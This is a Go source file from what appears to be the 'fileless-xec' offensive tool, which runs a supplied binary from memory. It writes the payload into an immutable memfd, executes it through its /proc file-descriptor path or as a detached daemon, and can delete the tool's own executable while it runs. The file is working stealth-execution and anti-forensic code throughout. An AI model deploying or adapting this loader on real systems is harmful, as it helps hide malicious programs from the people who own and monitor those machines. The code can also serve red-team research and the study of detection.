//go:build !windows
// +build !windows

package exec

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"

	"github.com/ariary/fileless-xec/pkg/config"

	"github.com/creack/pty"
	"github.com/justincormack/go-memfd"
)

//Remove current file while its execution
func selfRemove() {
	err := os.Remove("./fileless-xec")
	if err != nil {
		fmt.Println(err)
	}
}

//UnstealthyExec file retrieve output
func UnstealthyExec(filename string, argv []string, envv []string) (err error) {
	defer os.Remove(filename) //with runtime.GOOS != "windows" we could remove earlier
	cmd := exec.Command("./" + filename)
	cmd.Args = argv
	cmd.Env = envv
	// Start the command with a pty.
	ptmx, _ := pty.Start(cmd)

	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			pty.InheritSize(os.Stdin, ptmx)
		}
	}()
	ch <- syscall.SIGWINCH                        // Initial resize.
	defer func() { signal.Stop(ch); close(ch) }() // Cleanup signals when done.

	// Copy stdin to the pty and the pty to stdout.
	// NOTE: The goroutine will keep reading until the next keystroke before returning.
	var outBuffer bytes.Buffer
	var inBuffer bytes.Buffer

	mwOut := io.MultiWriter(os.Stdout, &outBuffer)

	in := io.TeeReader(os.Stdin, &inBuffer)
	go func() { _, _ = io.Copy(ptmx, in) }()
	_, _ = io.Copy(mwOut, ptmx)

	return err
}

//Exec binary file using file descriptor
//Note: syscall.Exec does not return on success, it causes the current process to be replaced by the one executed
func Fexecve(fd uintptr, argv []string, envv []string) (err error) {
	fname := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)
	err = syscall.Exec(fname, argv, envv)

	return err
}

//FexecveDaemon: Exec binary file using file descriptor. The program is a daemon (setsid).
//No input, or output
func FexecveDaemon(fd uintptr, argv []string, envv []string) (err error) {
	fname := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)
	var sysProcAttr = syscall.SysProcAttr{Setsid: true}
	var procAttr = syscall.ProcAttr{Env: envv, Sys: &sysProcAttr, Files: []uintptr{0, 1, 2}} //Files: stdin,stderr,stout apply to the same tty than filelessxec
	//to still have stdout and stdin
	_, err = syscall.ForkExec(fname, argv, &procAttr)
	//don't wait
	// if err == nil {
	// 	_, err = syscall.Wait4(pid, nil, 0, nil) //do we have to wait?
	// }

	return err
}

// Write Binary file on disk and chmod it to make it executable
func WriteBinaryFile(filename string, content string) (err error) {
	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(content)
	if err != nil {
		return err
	}
	//Make file executable
	err = os.Chmod(filename, 0700)
	if err != nil {
		return err
	}
	return nil
}

//Create a memfd with binary content and return it
func PrepareStealthExec(content string) (mfd *memfd.Memfd) {
	mfd, err := memfd.Create()
	if err != nil {
		panic(err)
	}
	//defer mfd.Close()
	_, _ = mfd.WriteString(content)
	err = mfd.SetImmutable()
	if err != nil {
		panic(err)
	}

	return mfd
}

//Exec a file witth filess-xec
func Filelessxec(cfg *config.Config) {
	if cfg.Unstealth { //Unstealth mode
		binary := "dummy"

		//write binary file locally
		err := WriteBinaryFile(binary, cfg.BinaryContent)
		if err != nil {
			fmt.Println(err)
		}
		//execute it
		err = UnstealthyExec(binary, cfg.ArgsExec, cfg.Environ)
		fmt.Println(err)

		if cfg.SelfRm && runtime.GOOS != "windows" {
			selfRemove()
		}
	} else { //Stealth mode

		mfd := PrepareStealthExec(cfg.BinaryContent)
		defer mfd.Close()
		fd := mfd.Fd()

		if cfg.SelfRm && runtime.GOOS != "windows" {
			selfRemove()
		}
		if cfg.Daemon {
			FexecveDaemon(fd, cfg.ArgsExec, cfg.Environ)
		} else {
			Fexecve(fd, cfg.ArgsExec, cfg.Environ) //all line after that won't be executed due to syscall execve
		}

	}
}
